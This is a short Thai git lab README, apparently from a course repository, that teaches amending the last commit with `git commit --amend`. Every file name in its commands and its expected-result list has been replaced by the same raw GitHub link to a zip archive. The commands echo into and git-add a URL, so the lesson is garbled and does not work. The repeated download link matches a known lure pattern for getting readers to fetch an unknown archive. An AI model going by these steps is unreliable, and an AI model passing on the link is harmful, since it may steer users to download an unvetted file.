# git-lab-002
## ✏️ Lab: ลืม add ไฟล์ใน commit แรก

## เป้าหมาย
เรียนรู้การใช้ `git commit --amend` เพื่อแก้ไข commit ล่าสุด

## ขั้นตอน
```bash
git init
echo "print('hello')" > https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
git add https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
git commit -m "Initial commit"

echo "flask" > https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
git add https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
git commit --amend
```

## ผลลัพธ์ที่คาดหวัง
- commit ล่าสุดมีทั้ง https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip และ https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
